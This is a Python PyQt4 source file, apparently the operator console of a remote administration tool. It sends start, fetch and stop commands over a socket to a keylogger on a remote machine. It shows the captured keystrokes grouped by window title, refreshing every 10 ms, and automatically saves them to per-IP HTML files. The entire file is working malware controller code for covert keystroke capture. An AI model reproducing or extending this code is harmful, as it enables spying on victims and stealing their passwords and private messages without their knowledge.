from PyQt4.QtGui import *
from PyQt4.QtCore import *

from ast import literal_eval
import os
import socket
import datetime

from main_ui import Ui_Form

from libs.modechat import get

class mainPopup(QWidget, Ui_Form):
    def __init__(self, args):
        QWidget.__init__(self)
        self.setupUi(self)

        self.sock = args['sock']
        self.socket = args['socket']
        self.ipAddress = args['ipAddress']
        self.assets = args['assets']

        self.setWindowTitle('Keystrokes from - %s - Socket #%s' % (self.ipAddress, self.socket))

        self.stopKeyloggingButton.setChecked(True)

        self.startKeyloggingButton.clicked.connect(self.start_logging)
        self.stopKeyloggingButton.clicked.connect(self.stop_logging)
        self.alwaysTopButton.clicked.connect(self.always_top)
        self.saveButton.clicked.connect(self.save)

        self.last_title = ''

    def start_logging(self):

        # init folder
        now = datetime.datetime.now()
        folder = os.path.join('ServersData', self.ipAddress, 'Keystrokes')
        if not os.path.exists(folder):
            os.makedirs(folder)
        self.keystrokes_path = os.path.join(folder, '%s-%s-%s-%s-%s.html' % (now.year, now.month, now.day, now.hour, now.minute))

        data = get(self.sock, 'startKeylogger', 'keyloggerstart')
        if data == 'keyloggerStarted':
            # Create a QTimer
            self.timer = QTimer()
            self.timer.setSingleShot(False)
            self.timer.timeout.connect(self.set_logs)
            self.timer.start(10)

            self.stopKeyloggingButton.setChecked(False)
            self.startKeyloggingButton.setChecked(True)

    def save(self):
        file_name = QFileDialog.getSaveFileName(self, "Save To File", "", filter="html (*.html)")
        if file_name:
            open(file_name, 'w').write(self.keystokesText.toHtml())

    def auto_save(self):
        open(self.keystrokes_path, 'w').write(self.keystokesText.toHtml())

    def set_logs(self):
        try:
            data = get(self.sock, 'getKeystokes', 'keystokes')
            result = literal_eval(data)
            for k in result:
                if k != self.last_title:
                    self.keystokesText.append('<br><p align="center" style="background-color: #0F2D40; color: #2ecc71;">%s</p><br>' % k)
                self.keystokesText.moveCursor(QTextCursor.End)
                self.keystokesText.insertHtml(result[k])
                self.last_title = k
            if self.autoSaveButton.isChecked():
                self.auto_save()
        except AttributeError:
            pass
        except socket.error:
            self.stop_logging()

    def stop_logging(self):
        try:
            data = get(self.sock, 'stopKeylogger', 'keyloggerstop')
        except:
            return
        self.stopKeyloggingButton.setChecked(True)
        self.startKeyloggingButton.setChecked(False)
        try:
            self.timer.stop()
        except AttributeError:
            pass

    def always_top(self):
        if self.alwaysTopButton.isChecked():
            self.setWindowFlags(self.windowFlags() | Qt.WindowStaysOnTopHint)
            self.show()
        else:
            self.setWindowFlags(self.windowFlags() & ~Qt.WindowStaysOnTopHint)
            self.show()

    def closeEvent(self, event):
        try:
            self.stop_logging()
        except AttributeError:
            pass
